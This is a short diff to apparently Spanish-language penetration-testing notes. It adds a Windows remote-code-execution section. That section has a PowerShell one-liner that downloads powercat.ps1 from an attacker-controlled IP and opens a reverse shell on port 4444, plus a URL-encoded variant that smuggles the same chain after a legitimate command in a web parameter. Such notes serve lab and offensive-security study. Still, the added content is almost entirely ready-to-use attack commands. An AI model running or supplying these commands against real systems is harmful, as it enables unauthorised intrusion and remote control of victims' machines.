@@ -150,3 +150,13 @@ podemos crear una webshell en un parámetro php que ejecuta código de la siguie
 
 ##### Obtener una mejor shell:
         script /dev/null -c bash
+
+## RCE en windows
+
+    IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+
+##### Levantamos un server python en la carpeta con powercat
+
+##### modificado para web:
+
+    <legit_command>%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<IP>:8000%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<IP>%20-p%20<port>%20-e%20powershell
